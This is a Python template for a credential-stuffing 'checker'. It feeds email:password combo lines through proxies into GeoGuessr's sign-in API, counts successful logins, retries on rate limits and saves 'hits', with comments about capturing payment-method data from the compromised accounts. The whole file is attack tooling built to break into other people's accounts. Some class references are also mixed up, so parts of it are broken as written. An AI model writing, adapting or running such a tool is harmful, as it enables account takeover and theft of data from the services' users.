from checker_base import CaptureBase, CheckerBase, cli
from dataclasses import dataclass
import asyncio
import aiohttp
import logging


@dataclass
class YourCheckerCapture(CaptureBase):
    #assign your capture variables here NOT IN CAPTUREBASE

    def output(self):
        cli.clear()
        cli.print_title()
        print(f'Valid: {self.valid}/{self.checked - self.retries}')
        print(f'Remaining: {self.remaining}')
        print(f'Retries: {self.retries}')
        print(f'CPM: {self.cpm}')



class YourCheckerAPI():
    class Unauthorized(Exception):
        pass

    class RateLimit(Exception):
        pass

    def __init__(self, proxy=None):
        self._session = aiohttp.ClientSession(headers=self._get_headers())
        self.proxy = proxy

        self.nick = None

    def _get_headers(self):
        return {
            'your': 'headers'
        }

    async def request(self, method:str, path:str, payload:any=None, headers:any=None) -> dict:
        kwargs={}
        if self.proxy:
            kwargs['proxy'] = 'http://' + self.proxy
        if payload:
            kwargs['json'] = payload
        if headers:
            kwargs['headers'] = headers
            
        async with self._session.request(method, path, **kwargs) as resp:   

            if resp.ok:
                data = await resp.json()

                return data
            else:
                logging.debug(f'Request failure: status_code={resp.status}\n{resp.text}' )
                if resp.status == 429 or resp.status == 405:
                    raise YourCheckerAPI.RateLimit

                raise YourCheckerAPI.Unauthorized

    async def __aenter__(self):
        return self

    async def __aexit__(self, *excinfo):
        await self._session.close()
        pass


    async def login(self, username: str, password: str):
        payload = {
            "email": username,
            "password": password
        }
        resp = await self.request('POST', 'https://www.geoguessr.com/api/v3/accounts/signin', payload)
        return resp


class YourChecker(CheckerBase):
    def __init__(self):
        super().__init__('input/lines.txt')
        self.capture = YourCheckerCapture(len(self.lines))

    async def check(self, line:str, proxy):
        self.capture.checked += 1
        # self.capture.output()

        line_split = line.split(':')

        #handle errors here, such as unauthorized
        #get all your data here, then exit the async with to save resources.
        async with YourChecker(proxy) as client:
            try:
                user = await client.login(**{'username': line_split[0], 'password': line_split[1]})
                if user.get('nick') == None:
                    return
                self.capture.valid += 1
            except YourChecker.Unauthorized:
                return
            except YourChecker.RateLimit:
                self.capture.retries += 1
                await self.queue.put(line)
                return
            
        #handle if statements here such as checking if account has payment method
        
        file_name = 'capture' #file name is the file it will be written to
        capture = []
        
        #USE GET FUNCTION, AS BRACKET NOTATION WILL CAUSE ERRORS IF KEY DOESN'T EXIST.
        if user.get('SOME JSON VALUE SUCH AS PAYMENT METHOD') == True:
            file_name = 'payment_methods'
            capture.append('your pm data')
        
        #this is geoguesser capture, it formats some data better for lines
        unformatted_medals = user.get('competitionMedals')
        if unformatted_medals:
            file_name = 'medals'
            formatted_medals = []
            for name, value in unformatted_medals.items():
                formatted_medals.append(f'{name}={value}')
            capture.append(formatted_medals)

        #sometimes u might want to write to multiple files
        await self.write_hit(file_name, line, capture)

